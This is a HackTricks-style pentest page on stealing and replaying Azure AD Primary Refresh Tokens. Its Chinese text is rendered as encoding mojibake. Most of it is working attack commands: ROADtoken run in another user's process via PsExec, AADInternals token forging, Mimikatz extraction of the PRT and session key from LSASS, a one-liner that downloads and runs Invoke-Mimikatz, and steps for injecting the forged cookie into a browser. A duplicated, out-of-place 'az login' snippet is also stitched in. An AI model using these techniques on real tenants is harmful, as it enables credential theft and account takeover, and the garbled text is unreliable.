# Az - ä¼ é€’PRT

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºè‹±é›„çº§äººç‰©</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWSçº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**telegramç¾¤ç»„**](https://t.me/peass)æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## ä»€ä¹ˆæ˜¯PRT

{% content-ref url="az-primary-refresh-token-prt.md" %}
[az-primary-refresh-token-prt.md](az-primary-refresh-token-prt.md)
{% endcontent-ref %}

### æ£€æŸ¥æ˜¯å¦æ‹¥æœ‰PRT
```
Dsregcmd.exe /status
```
åœ¨ SSO State éƒ¨åˆ†ï¼Œæ‚¨åº”è¯¥çœ‹åˆ° **`AzureAdPrt`** è®¾ç½®ä¸º **YES**ã€‚

<figure><img src="../../../.gitbook/assets/image (10) (3).png" alt=""><figcaption></figcaption></figure>

åœ¨åŒæ ·çš„è¾“å‡ºä¸­ï¼Œæ‚¨è¿˜å¯ä»¥çœ‹åˆ° **è®¾å¤‡æ˜¯å¦åŠ å…¥äº† Azure**ï¼ˆåœ¨ `AzureAdJoined` å­—æ®µä¸­ï¼‰ï¼š

<figure><img src="../../../.gitbook/assets/image (10) (2).png" alt=""><figcaption></figcaption></figure>

## PRT Cookie

PRT cookie å®é™…ä¸Šè¢«ç§°ä¸º **`x-ms-RefreshTokenCredential`**ï¼Œå®ƒæ˜¯ä¸€ä¸ª JSON Web Token (JWT)ã€‚JWT åŒ…å« **3ä¸ªéƒ¨åˆ†**ï¼Œ**å¤´éƒ¨**ã€**æœ‰æ•ˆè½½è·** å’Œ **ç­¾å**ï¼Œç”± `.` åˆ†éš”å¹¶ä¸”éƒ½æ˜¯ url-safe base64 ç¼–ç çš„ã€‚ä¸€ä¸ªå…¸å‹çš„ PRT cookie åŒ…å«ä»¥ä¸‹å¤´éƒ¨å’Œä¸»ä½“ï¼š
```json
{
"alg": "HS256",
"ctx": "oYKjPJyCZN92Vtigt/f8YlVYCLoMu383"
}
{
"refresh_token": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAZ18nQkT-eD6Hqt7sf5QY0iWPSssZOto]<cut>VhcDew7XCHAVmCutIod8bae4YFj8o2OOEl6JX-HIC9ofOG-1IOyJegQBPce1WS-ckcO1gIOpKy-m-JY8VN8xY93kmj8GBKiT8IAA",
"is_primary": "true",
"request_nonce": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAPrlbf_TrEVJRMW2Cr7cJvYKDh2XsByis2eCF9iBHNqJJVzYR_boX8VfBpZpeIV078IE4QY0pIBtCcr90eyah5yAA"
}
```
**`refresh_token`** åŒ…å«å®é™…çš„ **PRT**ã€‚å®ƒä½¿ç”¨ Azure AD ç®¡ç†çš„å¯†é’¥è¿›è¡ŒåŠ å¯†ï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•æŸ¥çœ‹å…¶ä¸­çš„å†…å®¹æˆ–å¯¹å…¶è¿›è¡Œè§£å¯†ã€‚**`is_primary`** è¡¨ç¤ºè¿™ **åŒ…å«ä¸»è¦çš„åˆ·æ–°ä»¤ç‰Œ**ã€‚`request_nonce` ä» `logon.microsoftonline.com` é¡µé¢ä¼ é€’ï¼Œä»¥ç¡®ä¿ cookie åªèƒ½ç”¨äºé‚£æ¬¡ç™»å½•ä¼šè¯ã€‚

## ä¼ é€’ PRT

### æ”»å‡» - ROADtoken

æœ‰å…³æ­¤æ–¹æ³•çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·[**æŸ¥çœ‹æ­¤å¸–å­**](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)ã€‚ROADtoken å°†ä»æ­£ç¡®çš„ç›®å½•è¿è¡Œ **`BrowserCore.exe`** å¹¶ä½¿ç”¨å®ƒæ¥ **è·å– PRT cookie**ã€‚ç„¶åå¯ä»¥å°†æ­¤ cookie ä¸ ROADtools ä¸€èµ·ä½¿ç”¨è¿›è¡Œè®¤è¯ï¼Œå¹¶ **è·å–æŒä¹…çš„åˆ·æ–°ä»¤ç‰Œ**ã€‚

è¦ç”Ÿæˆæœ‰æ•ˆçš„ PRT cookieï¼Œé¦–å…ˆéœ€è¦ä¸€ä¸ª nonceã€‚\
ä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è·å–ï¼š
```powershell
$TenantId = "19a03645-a17b-129e-a8eb-109ea7644bed"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
"URI"     = $URL
"Method"  = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
AwABAAAAAAACAOz_BAD0_8vU8dH9Bb0ciqF_haudN2OkDdyluIE2zHStmEQdUVbiSUaQi_EdsWfi1 9-EKrlyme4TaOHIBG24v-FBV96nHNMgAA
```
æˆ–ä½¿ç”¨ [**roadrecon**](https://github.com/dirkjanm/ROADtools)ï¼š
```powershell
roadrecon auth prt-init
```
ç„¶åæ‚¨å¯ä»¥ä½¿ç”¨ [**roadtoken**](https://github.com/dirkjanm/ROADtoken) æ¥è·å–æ–°çš„ PRTï¼ˆåœ¨è¦æ”»å‡»çš„ç”¨æˆ·çš„è¿›ç¨‹ä¸­è¿è¡Œè¯¥å·¥å…·ï¼‰ï¼š
```powershell
.\ROADtoken.exe <nonce>
```
As oneliner:

{% code overflow="wrap" %}
`az login --service-principal -u <app-id> -p <password-or-cert> --tenant <tenant-id>` 
{% endcode %}

ä½œä¸ºä¸€è¡Œä»£ç ï¼š

{% code overflow="wrap" %}
`az login --service-principal -u <app-id> -p <password-or-cert> --tenant <tenant-id>` 
{% endcode %}
```powershell
Invoke-Command - Session $ps_sess -ScriptBlock{C:\Users\Public\PsExec64.exe - accepteula -s "cmd.exe" " /c C:\Users\Public\SessionExecCommand.exe UserToImpersonate C:\Users\Public\ROADToken.exe AwABAAAAAAACAOz_BAD0__kdshsy61GF75SGhs_[...] > C:\Users\Public\PRT.txt"}
```
```markdown
ç„¶åæ‚¨å¯ä»¥ä½¿ç”¨**ç”Ÿæˆçš„cookie**æ¥**ç”Ÿæˆä»¤ç‰Œ**ï¼Œä»¥é€šè¿‡Azure AD **Graph**æˆ–Microsoft Graphè¿›è¡Œ**ç™»å½•**ï¼š
```
```powershell
roadrecon auth --prt-cookie <prt_cookie>

Connect-AzureAD --AadAccessToken <token> --AccountId <acc_ind>
```
### æ”»å‡» - ä½¿ç”¨ AADInternals

`Get-AADIntUserPRTToken` **è·å–ç”¨æˆ·çš„ PRT ä»¤ç‰Œ** æ¥è‡ª Azure AD åŠ å…¥æˆ–æ··åˆåŠ å…¥çš„è®¡ç®—æœºã€‚ä½¿ç”¨ `BrowserCore.exe` æ¥è·å– PRT ä»¤ç‰Œã€‚
```powershell
# Get the PRToken
$prtToken = Get-AADIntUserPRTToken

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
```
æˆ–è€…ï¼Œå¦‚æœæ‚¨æœ‰Mimikatzçš„å€¼ï¼Œæ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨AADInternalsæ¥ç”Ÿæˆä¸€ä¸ªä»¤ç‰Œï¼š
```powershell
# Mimikat "PRT" value
$MimikatzPRT="MC5BWU..."

# Add padding
while($MimikatzPrt.Length % 4) {$MimikatzPrt += "="}

# Decode
$PRT=[text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Mimikatz "Clear key" value
$MimikatzClearKey="37c5ecdfeab49139288d8e7b0732a5c43fac53d3d36ca5629babf4ba5f1562f0"

# Convert to Byte array and B64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzClearKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate PRTToken with Nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce
$prtToken
## You can already use this token ac cookie in the browser

# Get access token from prtToken
$AT = Get-AADIntAccessTokenForAzureCoreManagement -PRTToken $prtToken

# Verify access and connect with Az. You can see account id in mimikatz prt output
Connect-AzAccount -AccessToken $AT -TenantID <tenant-id> -AccountId <acc-id>
```
è½¬åˆ° [https://login.microsoftonline.com](https://login.microsoftonline.com)ï¼Œæ¸…é™¤ login.microsoftonline.com çš„æ‰€æœ‰ cookies å¹¶è¾“å…¥ä¸€ä¸ªæ–°çš„ cookieã€‚
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
ç„¶åè®¿é—® [https://portal.azure.com](https://portal.azure.com)

{% hint style="danger" %}
å…¶ä½™çš„åº”è¯¥ä¿æŒé»˜è®¤è®¾ç½®ã€‚ç¡®ä¿ä½ å¯ä»¥åˆ·æ–°é¡µé¢ä¸”cookieä¸ä¼šæ¶ˆå¤±ï¼Œå¦‚æœå®ƒæ¶ˆå¤±äº†ï¼Œä½ å¯èƒ½çŠ¯äº†ä¸€ä¸ªé”™è¯¯ï¼Œéœ€è¦é‡æ–°å¼€å§‹è¿™ä¸ªè¿‡ç¨‹ã€‚å¦‚æœæ²¡æœ‰ï¼Œä½ åº”è¯¥å°±æ²¡é—®é¢˜äº†ã€‚
{% endhint %}

### æ”»å‡» - Mimikatz

#### æ­¥éª¤

1. **æå–** **LSASSä¸­çš„PRT** å¹¶ä¿å­˜ä»¥å¤‡åç”¨ã€‚
2. **æå–** **ä¼šè¯å¯†é’¥**ã€‚å¦‚æœä½ è¿˜è®°å¾—ï¼Œè¿™æ˜¯è¢«æœ¬åœ°è®¾å¤‡é¢å‘ç„¶åé‡æ–°åŠ å¯†çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨DPAPIä¸»å¯†é’¥æ¥**è§£å¯†å®ƒ**ã€‚æ›´å¤šå…³äºDPAPIçš„ä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹è¿™ä¸ª [**HackTricks**](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords) é“¾æ¥æˆ– [**Pass-the-cookie æ”»å‡»**](az-pass-the-cookie.md)ã€‚
3. ä½¿ç”¨è§£å¯†åçš„ä¼šè¯å¯†é’¥ï¼Œæˆ‘ä»¬å°†è·å¾—PRTå’Œä¸Šä¸‹æ–‡çš„æ´¾ç”Ÿå¯†é’¥ã€‚è¿™æ˜¯**åˆ›å»ºæˆ‘ä»¬çš„PRT cookie**æ‰€å¿…éœ€çš„ã€‚æ´¾ç”Ÿå¯†é’¥æ˜¯ç”¨æ¥ä¸ºcookieç­¾åJWTçš„ã€‚Dirk-jan åœ¨ [è¿™é‡Œ](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/) å¯¹è¿™ä¸ªè¿‡ç¨‹è¿›è¡Œäº†å¾ˆå¥½çš„è§£é‡Šã€‚

ä½ å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°å¯¹æ‰§è¡Œè¿‡ç¨‹çš„**æ·±å…¥è§£é‡Š**æ¥æå–è¿™äº›ç»†èŠ‚ï¼š [**https://dirkjanm.io/digging-further-into-the-primary-refresh-token/**](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)

{% hint style="warning" %}
è¿™ç§æ–¹æ³•åœ¨2021å¹´8æœˆä¹‹åçš„ä¿®å¤ä¸­ä¸ä¼šå·¥ä½œï¼Œä»¥è·å–å…¶ä»–ç”¨æˆ·çš„PRTä»¤ç‰Œï¼Œå› ä¸ºåªæœ‰ç”¨æˆ·è‡ªå·±èƒ½è·å–ä»–çš„PRTï¼ˆæœ¬åœ°ç®¡ç†å‘˜ä¸èƒ½è®¿é—®å…¶ä»–ç”¨æˆ·çš„PRTsï¼‰ï¼Œä½†å¯ä»¥è®¿é—®ä»–è‡ªå·±çš„ã€‚
{% endhint %}

{% hint style="danger" %}
**ä¸Šæ¬¡æˆ‘å°è¯•è¿™ç§ç”Ÿæˆcookieçš„æ–¹æ³•æ²¡æœ‰æˆåŠŸ**
{% endhint %}

ä½ å¯ä»¥ä½¿ç”¨ **mimikatz** æ¥æå–PRTï¼š
```powershell
mimikatz.exe
Privilege::debug
Sekurlsa::cloudap

# Or in powershell
iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
```
**å¤åˆ¶**æ ‡è®°ä¸º**Prt**çš„éƒ¨åˆ†å¹¶ä¿å­˜ã€‚\
è¿˜è¦æå–ä¼šè¯å¯†é’¥ï¼ˆ**`ProofOfPossesionKey`**å­—æ®µçš„**`KeyValue`**ï¼‰ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚è¿™æ˜¯åŠ å¯†çš„ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨DPAPIä¸»å¯†é’¥æ¥è§£å¯†å®ƒã€‚

å¦‚æœä½ æ²¡æœ‰çœ‹åˆ°ä»»ä½•PRTæ•°æ®ï¼Œå¯èƒ½æ˜¯å› ä¸ºä½ çš„è®¾å¤‡æ²¡æœ‰åŠ å…¥Azure ADï¼Œæˆ–è€…ä½ å¯èƒ½**æ­£åœ¨è¿è¡Œæ—§ç‰ˆæœ¬**çš„Windows 10ã€‚

è¦**è§£å¯†**ä¼šè¯å¯†é’¥ï¼Œä½ éœ€è¦å°†æƒé™**æå‡**åˆ°**SYSTEM**ï¼Œä»¥ä¾¿åœ¨è®¡ç®—æœºä¸Šä¸‹æ–‡ä¸­è¿è¡Œï¼Œä»¥ä¾¿èƒ½å¤Ÿä½¿ç”¨**DPAPIä¸»å¯†é’¥è¿›è¡Œè§£å¯†**ã€‚ä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥åšåˆ°è¿™ä¸€ç‚¹ï¼š
```
token::elevate
dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```
#### é€‰é¡¹ 1

* ç°åœ¨ä½ æƒ³è¦å¤åˆ¶ä¸¤ä¸ªå€¼ï¼Œé¦–å…ˆæ˜¯ Context å€¼ï¼š

<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

* ç„¶åæ˜¯æ´¾ç”Ÿçš„å¯†é’¥å€¼ï¼š

<figure><img src="../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

* æœ€åä½ å¯ä»¥ä½¿ç”¨æ‰€æœ‰è¿™äº›ä¿¡æ¯æ¥**ç”Ÿæˆ PRT cookies**ï¼š
```bash
Dpapi::cloudapkd /context:[CONTEXT] /derivedkey:[DerivedKey] /Prt:[PRT]
```
<figure><img src="../../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

* è®¿é—® [https://login.microsoftonline.com](https://login.microsoftonline.com)ï¼Œæ¸…é™¤ login.microsoftonline.com çš„æ‰€æœ‰ cookies å¹¶è¾“å…¥ä¸€ä¸ªæ–°çš„ cookieã€‚
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
* ç„¶åè®¿é—® [https://portal.azure.com](https://portal.azure.com)

{% hint style="danger" %}
å…¶ä½™è®¾ç½®åº”ä¿æŒé»˜è®¤ã€‚ç¡®ä¿ä½ å¯ä»¥åˆ·æ–°é¡µé¢ä¸”cookieä¸ä¼šæ¶ˆå¤±ï¼Œå¦‚æœå®ƒæ¶ˆå¤±äº†ï¼Œä½ å¯èƒ½çŠ¯äº†é”™è¯¯ï¼Œéœ€è¦é‡æ–°èµ°ä¸€éæµç¨‹ã€‚å¦‚æœæ²¡æœ‰æ¶ˆå¤±ï¼Œé‚£ä¹ˆä½ åº”è¯¥å°±æ²¡é—®é¢˜äº†ã€‚
{% endhint %}

#### é€‰é¡¹ 2

* é¦–å…ˆæ›´æ–°PRTï¼Œè¿™ä¼šå°†å…¶ä¿å­˜åœ¨`roadtx.prt`ä¸­ï¼š

{% code overflow="wrap" %}
```bash
roadtx prt -a renew --prt <PRT From mimikatz> --prt-sessionkey <clear key from mimikatz>
```
{% endcode %}

* ç°åœ¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ `roadtx browserprtauth` å‘½ä»¤é€šè¿‡äº¤äº’å¼æµè§ˆå™¨**è¯·æ±‚ä»¤ç‰Œ**ã€‚å¦‚æœæˆ‘ä»¬ä½¿ç”¨ `roadtx describe` å‘½ä»¤ï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°è®¿é—®ä»¤ç‰ŒåŒ…å«äº†ä¸€ä¸ªMFAå£°æ˜ï¼Œå› ä¸ºåœ¨è¿™ç§æƒ…å†µä¸‹æˆ‘ä½¿ç”¨çš„PRTä¹ŸåŒ…å«äº†MFAå£°æ˜ã€‚
```bash
roadtx browserprtauth
roadtx describe < .roadtools_auth
```
## å‚è€ƒèµ„æ–™

* [https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/)
* [https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWSçº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
